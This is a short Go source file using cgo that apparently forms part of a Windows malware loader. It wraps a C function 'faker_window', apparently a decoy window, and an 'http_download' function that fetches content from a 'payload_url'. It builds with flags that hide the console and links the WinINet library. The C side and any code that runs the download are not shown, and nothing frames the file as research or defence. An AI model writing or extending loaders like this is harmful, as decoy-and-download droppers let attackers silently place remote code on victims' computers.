package main

/*
#cgo CFLAGS: -mwindows
#cgo LDFLAGS: -lwininet
#include "faker.h"
*/
import "C"


func FakerWindow() {
	C.faker_window()
}

func httpDownload(payload_url string) string {
	pu := C.CString(payload_url)
	resp := C.http_download(pu)
	return C.GoString(resp)
}